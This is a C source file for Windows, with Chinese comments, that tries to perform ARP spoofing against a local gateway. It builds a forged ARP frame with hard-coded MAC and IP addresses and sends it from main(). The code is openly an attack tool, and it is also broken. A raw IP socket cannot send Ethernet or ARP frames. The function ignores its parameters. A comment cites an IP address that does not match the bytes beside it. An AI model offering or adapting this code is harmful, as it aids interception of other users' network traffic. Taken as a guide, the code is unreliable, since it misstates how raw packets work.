#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>

#include "pro_format.h"


struct MY_FRAME {
  struct ETHERNET_HDR ehdr;
  struct ARP_DATA arpData;
};

// ARP 欺骗函数
void spoofARP(const char* targetIP, const char* fakeMAC) {
    // 创建套接字
    SOCKET sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_RAW, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        printf("Failed to create socket. Error code: %d\n", WSAGetLastError());
        return;
    }

    // 设置套接字选项，允许发送原始数据包
    BOOL optval = TRUE;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&optval, sizeof(optval)) == SOCKET_ERROR) {
        printf("Failed to set socket options. Error code: %d\n", WSAGetLastError());
        closesocket(sock);
        return;
    }
    struct MY_FRAME frame= {
      .ehdr = {
        .dest_mac = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF},
        .src_mac = {0xC0, 0xB6, 0xF9, 0x89, 0xEC, 0xE8},
        .proto_type = {0x08, 0x06}
      },
      .arpData = {
        .hardware_type = {0, 1},
        .protocol_type = {0x08, 0x0},
        .hardware_size = 6,
        .protocol_size = 4,
        .opcode = {0, 1},
        .sender_mac = {0xC0, 0xB6, 0xF9, 0x89, 0xEC, 0xE8},
        .sender_ip = {0xC0, 0xA8, 0, 0x6C},
        .target_mac = {0},
        .target_ip = {0xC0, 0xA8, 0, 0x1} //20.189.173.25
      }
    };

    // 发送数据包
    struct sockaddr_in destAddr;
    destAddr.sin_family = AF_INET;
    destAddr.sin_addr.s_addr = inet_addr("192.168.0.1");
    destAddr.sin_port = htons(0);

    if (sendto(sock, (char *)&frame, sizeof(frame), 0, (struct sockaddr *)&destAddr, sizeof(destAddr)) == SOCKET_ERROR) {
        printf("Failed to send packet. Error code: %d\n", WSAGetLastError());
    } else {
        printf("ARP spoofing packet sent successfully.\n");
    }

    closesocket(sock);
}

int main() {
    // 初始化 Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("Failed to initialize Winsock. Error code: %d\n", WSAGetLastError());
        return 1;
    }

    // 执行 ARP 欺骗
    spoofARP(0, 0);

    // 清理 Winsock
    WSACleanup();
    return 0;
}